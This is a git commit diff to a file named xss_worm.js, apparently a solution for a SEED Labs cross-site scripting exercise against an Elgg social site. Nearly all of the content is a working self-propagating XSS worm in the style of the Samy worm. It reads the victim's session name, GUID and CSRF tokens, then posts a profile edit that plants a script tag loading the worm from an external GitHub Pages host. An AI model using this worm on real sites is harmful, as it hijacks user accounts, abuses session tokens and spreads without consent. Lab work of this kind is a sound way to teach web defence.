f0ab7e09738b23046229ba3c12314d1de439bfb9
n1ck <nateyzbzzz@gmail.com>
2024-09-21 08:17:15 +0800

    Update xss_worm.js

--- xss_worm.js
+++ xss_worm.js
@@ -1,25 +1,27 @@
 window.onload = function() {
-    // Define the worm code to be injected into the victim's profile
-    var wormCode = encodeURIComponent(
-        "<script type=\"text/javascript\" " +
-        "id=\"worm\" " +
-        "src=\"https://n1ck-n4m3.github.io/js/xss_worm.js\">" + 
-        "</" + "script>"
-    );
+    // Retrieve current user's basic information and security tokens
+    var userName = "&name=" + encodeURIComponent(elgg.session.user.name);
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
-    // Construct the description field with the worm code
-    var desc = "&description=Samy is my hero " + wormCode;
-    desc += "&accesslevel[description]=2";  // Set the access level of the description field
+    // Construct worm script tags to self-propagate
+    var wormScriptURL = "https://n1ck-n4m3.github.io/js/xss_worm.js";
+    var headerTag = "<script type='text/javascript' src='" + wormScriptURL + "'></script>";
+    
+    // Construct the profile description content that includes the worm and a custom message
+    var content = "description=XSS_WORM by Samy!!! " + headerTag;
 
-    // Fixed URL to modify the profile (you can replace 'alice' with any user's profile edit URL)
-    var sendurl = "http://www.seed-server.com/action/profile/edit"; 
+    var samyGuid = 59; // Assume Samy's user GUID is 59
+    var sendurl = "http://www.seed-server.com/action/profile/edit?" + ts + token + userName + guid + "&" + content;
 
-    // Create and send the Ajax POST request to modify the victim's profile
-    var Ajax = new XMLHttpRequest();
-    Ajax.open("POST", sendurl, true);
-    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    Ajax.send(desc); 
-
-    // Optional: Console log for debugging
-    console.log("Worm successfully injected and profile updated.");
+    // Only execute the code if the current user is not Samy to avoid self-infection
+    if (elgg.session.user.guid != samyGuid) {
+        // Create and send an Ajax request to modify the profile
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+    }
 };
